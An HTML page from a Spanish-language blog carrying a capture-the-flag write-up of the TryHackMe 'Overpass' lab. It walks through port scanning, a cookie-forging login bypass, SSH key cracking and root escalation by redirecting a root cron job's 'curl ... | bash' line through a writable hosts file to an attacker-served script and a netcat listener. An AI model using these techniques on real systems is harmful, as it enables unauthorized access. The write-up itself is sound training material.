@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <head>
+    <!-- Include Meta Tags Here -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1 user-scalable=no, shrink-to-fit=no">
+<meta content='#000000' name='theme-color'/>
+<meta name="keywords" content="Site, Template, Theme">
+<title>CyberWiki | Overpass</title>
+
+<!-- Open Graph general (Facebook, Pinterest & Google+) -->
+<meta name="og:title" content="CyberWiki | Overpass">
+<meta name="og:description" content="Vamos a realizar la maquina Overpass de THM, donde debemos de entrar en una máquina con el fin de encontrar información (flags).">
+<meta name="og:image" content="../assets/images/Rooms/Overpass/overpass.png">
+<meta name="og:image:alt" content="CyberWiki | Overpass">
+<meta name="og:url" content="http://localhost:4000/blog/Overpass">
+<meta name="article:author" content="https://www.facebook.com/">
+<meta name="og:site_name" content="CyberWiki | Overpass">
+<meta name="og:type" content="website">
+<!-- Twitter -->
+<meta property="twitter:card" content="summary_large_image"/>
+<meta name="twitter:title" content="CyberWiki | Overpass">
+<meta name="twitter:description" content="Vamos a realizar la maquina Overpass de THM, donde debemos de entrar en una máquina con el fin de encontrar información (flags).">
+<meta name="twitter:site" content="@">
+<meta name="twitter:creator" content="@">
+<meta name="twitter:image:src" content="../assets/images/Rooms/Overpass/overpass.png">
+<!-- Search Engine -->
+<meta name="description" content="Vamos a realizar la maquina Overpass de THM, donde debemos de entrar en una máquina con el fin de encontrar información (flags).">
+<meta name="image" content="../assets/images/Rooms/Overpass/overpass.png">
+<!-- Schema.org for Google -->
+<meta itemprop="name" content="CyberWiki | Overpass">
+<meta name="author" content="Jose Luis Venega"/>
+<meta itemprop="description" content="Vamos a realizar la maquina Overpass de THM, donde debemos de entrar en una máquina con el fin de encontrar información (flags).">
+<meta itemprop="image" content="../assets/images/Rooms/Overpass/overpass.png">
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
+
+    gtag('config', '');
+</script>
+    <title>CyberWiki</title>
+    <link rel="stylesheet" href="/assets/css/style.css">
+      <!-- Incluye el CSS de Prism.js -->
+    <link rel="stylesheet" href="../prism.css">
+    <script src="https://kit.fontawesome.com/6a97161b76.js" crossorigin="anonymous"></script>
+    <link rel="shortcut icon" href="/assets/images/favicon.png" type="image/x-icon">
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var titleElement = document.getElementById('page-title');
+            var icon = "/assest/images/favicon.png"; // Puedes usar cualquier emoji o icono aquí
+            titleElement.textContent = icon + " " + titleElement.textContent;
+        });
+    </script>
+</head>
+</head>
+
+<body>
+  <nav class="navbar is-black is-fixed-top is-rounded" role="navigation" aria-label="main navigation" id="navbar">
+    <div class="container">
+
+        <!-- logo or branding image on left side -->
+       
+        <!-- Logo o imagen de marca en el lado izquierdo -->
+        <div class="navbar-brand">
+            <a class="navbar-item"
+            href="http://localhost:4000/">
+            <img src="/assets/images/favicon.png" alt="Site Icon" style="width: 24px; height: 24px; vertical-align: middle;">
+                <i class="/assest/images/favicon.png"></i> <!-- Icono  -->
+                <strong>CyberWiki</strong>
+            </a>
+            <div class="navbar-burger" data-target="navbar-menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+
+        <!-- children of navbar-menu must be navbar-start and/or navbar-end -->
+        <div class="navbar-menu has-background-black" id="navbar-menu">
+            <!-- navbar items | left side -->
+            <!-- <div class="navbar-start">
+            </div> -->
+            <!-- navbar items | right side -->
+            <div class="navbar-end">
+                <a class="navbar-item "
+                    href="http://localhost:4000/">HOME</a>
+                <a class="navbar-item" href="http://localhost:4000/#about">ABOUT</a>
+                <a class="navbar-item" href="http://localhost:4000/#contact">CONTACT</a>
+                <a class="navbar-item "
+                    href="http://localhost:4000/blog">WRITE-UPs</a>
+                <a class="navbar-item "
+                    href="http://localhost:4000/project">LABS</a>
+                <!-- <div class="navbar-item has-dropdown is-hoverable">
+    <a class="navbar-link">
+        MORE
+    </a>
+    <div class="navbar-dropdown has-background-black is-left">
+        
+        
+        
+        
+        
+        
+        
+        
+        <a href="http://localhost:4000/project"
+            class="navbar-item has-text-grey-light ">
+            Projects
+        </a>
+        
+        
+        
+        <a href="http://localhost:4000/test-page"
+            class="navbar-item has-text-grey-light ">
+            Test Page
+        </a>
+        
+         -->
+        <!-- <hr class="navbar-divider">
+    <a class="navbar-item">
+      Report an issue
+    </a> -->
+    <!-- </div>
+</div> -->
+            </div>
+        </div>
+    </div>
+</nav>
+<!-- Bulma Navbar JS -->
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        /* Get all "navbar-burger" elements */
+        var $navbarBurgers = Array.prototype.slice.call(document.querySelectorAll('.navbar-burger'), 0);
+        /* Check if there are any navbar burgers */
+        if ($navbarBurgers.length > 0) {
+            /* Add a click event on each of them */
+            $navbarBurgers.forEach(function ($el) {
+                $el.addEventListener('click', function () {
+                    /* Get the target from the "data-target" attribute */
+                    var target = $el.dataset.target;
+                    var $target = document.getElementById(target);
+                    /* Toggle the class on both the "navbar-burger" and the "navbar-menu" */
+                    $el.classList.toggle('is-active');
+                    $target.classList.toggle('is-active');
+                });
+            });
+        }
+    });
+</script>
+  <section class="hero is-fullheight has-text-centered" id="post">
+    <div class="hero-body">
+      <div class="container">
+        <a href="/blog/Overpass" class="has-text-black" id="title">
+          <h1 class="title has-text-centered is-2 has-text-weight-semibold ">Overpass</h1>
+        </a>
+        <hr class="has-background-black">
+        <div class="columns is-variable is-5 has-text-centered">
+          <div class="column is-6">
+            <div style="text-align: center; ">
+              <img src="../assets/images/Rooms/Overpass/overpass.png" alt="Overpass" id="post-image">
+            </div>
+          </div>
+          <div class="subtitle column is-5 has-text-left-desktop has-text-left-fullhd has-text-left-tablet has-text-center-mobile" style="text-align: left;" ">
+            
+            <p id="description" class="content is-small has-text-weight-medium is-uppercase">
+              Vamos a realizar la maquina Overpass de THM, donde debemos de entrar en una máquina con el fin de encontrar información (flags).
+              <!-- Enlace añadido aquí -->
+              <p class="subtitle is-uppercase is-6 has-text-weight-normal has-text-black-ter">Enlace de la room: 
+                <b><a href="https://tryhackme.com/r/room/overpass" target="page.enlace">Overpass</a></b>
+              </p>
+                
+              <p class="subtitle is-6 is-uppercase has-text-weight-normal has-text-black-ter">Dificultad de la room: 
+                <b>Fácil</b>
+              </p>
+            <p class="subtitle is-6 is-uppercase has-text-weight-normal has-text-black-ter">Publicado en
+              <b>August 07, 2024</b> by <a href="https://github.com/Joseeelv" target="_blank"><b class="has-text-link"><u>Jose Luis Venega</u></b>
+              </a>
+            </p><p class="subtitle is-uppercase">
+              <i class="fas fa-tags"></i>
+              
+              
+              <span class="tag is-link">Enumeración</span>
+              
+              
+              <span class="tag is-link">Privilege Escalation</span>
+              
+              
+              <span class="tag is-link">Cron</span>
+              
+              
+              <span class="tag is-link">Security</span>
+              
+              
+            </p><!-- <p class="subtitle is-uppercase"><i class="fas fa-clock"></i> <b class="has-text-link">
+                4 min
+              </b>READ</p> --></div>
+        </div>
+        <div class="content has-text-justified-desktop has-text-justified-fullhd has-text-justified has-text-justified-tablet has-text-left-mobile">
+          <p><p>Primero de todo vamos a realizar un escaneo de los puertos para ver que servicios tiene abiertos para aprovecharnos de eso.</p>
+
+<div style="text-align: center; ">
+  <table>
+    <tr>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:655px;" />
+        </div>
+      </td>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 1.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>Tenemos dos puertos abiertos → 22 (servicio ssh) y 80 (página web mediante http). Vamos a obtener información sobre ellos, vamos primero con el puerto 80 (la página web).</p>
+
+<div>
+  <table>
+    <tr>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 2.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+      </td>
+      <td>
+      Mediante `gobuster` buscamos directorios ocultos dentro de la web:
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 3.png" alt="Untitled" onclick="openModal(this.src)" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>En efecto, hay directorios ocultos, por tanto, vamos a acceder a ellos en especial a <code class="language-plaintext highlighter-rouge">/admin</code>, donde encontramos un login.</p>
+
+<p>Si leemos el código fuente de la pagina web encontramos un script js correspondiente al login:</p>
+
+<div style="text-align: center; ">
+  <table>
+    <tr>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 4.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:500px;" />
+        </div>
+      </td>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 5.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:500px;" />
+        </div>
+      </td>
+      <td>
+      <div style="text-align: center; ">
+        <img src="../assets/images/Rooms/Overpass/Untitled 6.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:500px;" />
+      </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>Vamos a login.js. Esta función es la encargada de obtener el user y la password y llevarla al endpoint para la respuesta de confirmación del login.</p>
+
+<p>Si leemos el script, vemos que la función Cookie.set tiene como parámetros la respuesta de cuando se envían las credenciales al endpoint, si mandamos el comando</p>
+
+<p><code class="language-plaintext highlighter-rouge">Cookies.set("SessionToken", )</code> iniciaremos sesión sin tener que esperar la respuesta del endpoint.</p>
+
+<p>(<em>Es la pista que nos da el reto :OWASP Top 10 Vuln! Do NOT bruteforce).</em></p>
+
+<p><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">OWASP Top 10 Vuln</a> hace referencia comentado a lo anterior.</p>
+
+<p>Es decir, que mediante la modificación de las Cookies podemos acceder al área de administración.
+Para ello vamos:</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 7.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Arriba creamos una cookie nueva, con el nombre <strong>SessionToken</strong> y Path <strong>”/”</strong>.</p>
+<div style="text-align: center; ">
+  <table>
+    <tr>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 8.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;" />
+        </div>
+      </td>
+      <td>
+        <div style="text-align: center; ">
+          <img src="../assets/images/Rooms/Overpass/Untitled 9.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;" />
+        </div>
+      </td>
+    </tr>
+  </table>
+</div>
+
+<p>Y bingo, estamos dentro, y hemos obtenido el nombre de usuario <strong>James **</strong> y una contraseña la cual está encriptada, para ello vamos a descargarla para que con las herramientas de JohnTheRipper (ssh2john y john) podamos descomprimirla.</p>
+
+<p>Contraseña obtenida!!!!</p>
+
+<p>Por temas de conexión, tuve que reiniciar la maquina 😟</p>
+
+<p>Procedemos a realizar el login shh con el usuario james:</p>
+
+<p>Estamos dentro, ahora vamos a ver los directorios que contiene y a navegar entre ellos.</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 10.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Ahí tenemos el user.txt, además tenemos otro archivo de texto</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 11.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>De este archivo podemos sacar información como:</p>
+
+<ul>
+  <li>La contraseña no es lo suficientemente fuerte</li>
+  <li>La contraseña se encuentra en un password manager</li>
+  <li>Hay un script automatizado → cron</li>
+</ul>
+
+<p>Sabiendo estas tres cosas vamos a proceder a convertirnos en root</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 12.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Existe un archivo .overpass donde se encuentran unas credenciales.</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 13.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>estas están encriptadas asi que vamos a desencriptarlas con el uso de Cyberchef</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 14.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Ahí tenemos algunas credenciales</p>
+
+<p>Ahora vamos a ver la tarea que está automatizada, para ello vamos hasta /etc y hacemos un cat de crontab</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 15.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Donde la tarea automatizada (cada minuto) es <code class="language-plaintext highlighter-rouge">curl overpass.thm/downloads/src/buildscript.sh | bash</code>.</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 16.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Si le echamos un ojo al archivo de los hosts, vemos que tenemos permisos de lectura y escritura, por tanto, podemos modificar alguno( en esencia overpass.thm) y poner la ip de nuestra vpn.</p>
+
+<p>Hacemos un <code class="language-plaintext highlighter-rouge">ip a</code>para ver la ip de nuestra maquina.</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 17.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Creamos un directorio downloads/src/buildscript.sh:</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 18.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>A continuación creamos un servidor http con el puerto 80.</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 19.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Y ahora situamos un puerto de escucha con netcat, donde nos aparecerá nuestra shell con el root</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 20.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<p>Hacemos un ls y por ultimo un cat para obtener nuestra flag del root</p>
+
+<div style="text-align: center; ">
+  <img src="../assets/images/Rooms/Overpass/Untitled 21.png" alt="Untitled" onclick="openModal(this.src)" />
+</div>
+
+<hr />
+</p>
+        </div>
+        
+        <div class="disqus-comments" id="disqus_thread"></div>
+        
+      </div>
+    </div>
+  </section>
+  <footer id="footer">
+    <!--Footer Button-->
+    <div class="container has-text-centered has-background-grey-darker" id="backtotop">
+        <a class="has-text-white" onclick="window.scroll(0,0)">BACK TO TOP</a>
+    </div>
+    <!--Footer Main Section-->
+    <div class="has-background-grey-darker">
+        <div class="container columns">
+            <!--Name Section-->
+            <div class="column has-text-left-desktop has-text-centered-mobile">
+                <a href="http://localhost:4000/#about">
+                    <div class="columns">
+                        <div class="column is-one-fifth-desktop is-one-fifth-fullhd is-one-quarter-tablet">
+                            <figure class="image is-64x64">
+                                <img class="is-rounded" src="/assets/images/me.png">
+                            </figure>
+                        </div>
+                        <div class="column is-marginless">
+                            <h5 class="has-text-grey-lighter">Jose Luis Venega</h5>
+                            <div class="content has-text-grey">
+                                <p>Hello, I am Jose Luis Venega Sánchez, a student of Computer Engineering ...</p>
+                            </div>
+                        </div>
+                    </div>
+                </a>
+            </div>
+
+            <!--Link Section-->
+            <div class="column has-text-white">
+                <h3>More Links</h3>
+                
+                
+                <!-- <li>
+                    <a href="http://localhost:4000/test-page">Test Page</a>
+                </li> -->
+                
+                
+                <li>
+                    <a target="_blank" href="http://localhost:4000/feed.xml">Subscribe via RSS</a>
+                </li>
+            </div>
+
+            <!--Blog-post Section-->
+            <div class="column has-text-white">
+                <h3>Recent Posts</h3>
+                
+                <li>
+                    <a href="http://localhost:4000/blog/ChillHack">ChillHack</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/blog/DNS">Sistema de Nombres de Dominio "DNS"</a>
+                </li>
+                
+                <li>
+                    <a href="http://localhost:4000/blog/Startup">Start-up</a>
+                </li>
+                
+            </div>
+        </div>
+    </div>
+    <!-- <div class="has-background-black has-text-centered has-text-white" id="credits">
+        <i class="far fa-copyright"></i> 2024 | <a href="https://github.com/thedevslot/WhatATheme" target="_blank" rel="noopener noreferrer">WhatATheme</a> - A Theme made with <i class="fas fa-heart has-text-danger"></i> by <a href="https://www.twitter.com/thedevslot" target="_blank" rel="noopener noreferrer">TheDevsLot</a> Powered by <a href="https://jekyllrb.com/" target="_blank">Jekyll</a>
+    </div> -->
+</footer>
+
+  <!-- Modal -->
+  <div id="myModal" class="modal">
+    <span class="close" onclick="closeModal()">&times;</span>
+    <img class="modal-content" id="img01">
+  </div>
+ <!-- Prism.js Script -->
+
+  <script src="../prism.js"></script>
+  <script>
+    function copyToClipboard(button) {
+    const codeBlock = button.closest('.code-container').querySelector('code');
+    navigator.clipboard.writeText(codeBlock.textContent).then(() => {
+        button.textContent = 'Copiado';
+        setTimeout(() => {
+            button.textContent = 'Copiar';
+        }, 2000);
+    }).catch(err => {
+        console.error('Error al copiar el texto: ', err);
+    });
+}
+
+     function openModal(imgSrc) {
+      var modal = document.getElementById("myModal");
+      var modalImg = document.getElementById("img01");
+
+      modal.style.display = "block";
+      setTimeout(function() {
+        modal.classList.add('show');
+      }, 10); // Delay to trigger the animation
+      modalImg.src = imgSrc;
+    }
+
+    function closeModal(event) {
+      if (event) event.stopPropagation(); // Prevents closing when clicking the close button
+      var modal = document.getElementById("myModal");
+      modal.classList.remove('show');
+      setTimeout(function() {
+        modal.style.display = "none";
+      }, 300); // Match this duration with the CSS animation duration
+    }
+
+    // Close modal when clicking outside the content
+    window.onclick = function(event) {
+      var modal = document.getElementById("myModal");
+      if (event.target == modal) {
+        closeModal();
+      }
+    }
+  </script>
+</body>
+</html>
